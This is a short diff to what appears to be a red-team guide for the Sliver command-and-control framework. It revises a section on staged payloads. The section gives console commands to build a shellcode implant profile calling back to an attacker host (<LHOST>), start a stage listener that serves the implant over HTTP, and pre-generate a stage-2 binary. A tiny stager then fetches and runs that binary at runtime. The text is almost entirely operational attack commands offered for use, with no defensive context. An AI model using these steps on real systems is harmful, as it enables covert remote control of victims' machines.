@@ -89,21 +89,24 @@ injected blob is only a few hundred bytes.
 
 ## 4. Staged payloads (small shellcode)
 
-A stager downloads the full implant over HTTP at runtime — keeps the injected
-shellcode tiny.
+A stage listener serves the implant over HTTP(S)/TCP (optionally compressed or
+encrypted), so a small stage-1 stager can fetch and run the full implant at
+runtime. Sliver serves and pre-generates the stage-2 binary; the tiny stage-1
+stager itself comes from the Armory (`beignet` / `malasada`) or your own loader.
 
 ```text
 # 1. Create a profile describing the implant
 sliver > profiles new --mtls <LHOST>:8888 --format shellcode my-profile
 
-# 2. Start a stage listener that serves the profile over HTTP(S)
+# 2. Start a stage listener that serves the implant over HTTP(S)
 sliver > stage-listener --url http://<LHOST>:8080 --profile my-profile
 
-# 3. Generate the (tiny) stager
-sliver > generate --format shellcode --stage-listener http://<LHOST>:8080 --save /tmp/stager.bin
+# 3. Pre-generate the stage-2 binary (optionally --compress / --aes-encrypt-key)
+sliver > profiles stage --save /tmp/stage2.bin my-profile
 ```
 
-Feed `/tmp/stager.bin` into `sliver2arrays.py` and any loader.
+Serve `/tmp/stage2.bin` yourself (e.g. `python3 -m http.server`) and point your
+stage-1 stager at it.
 
 ---
 
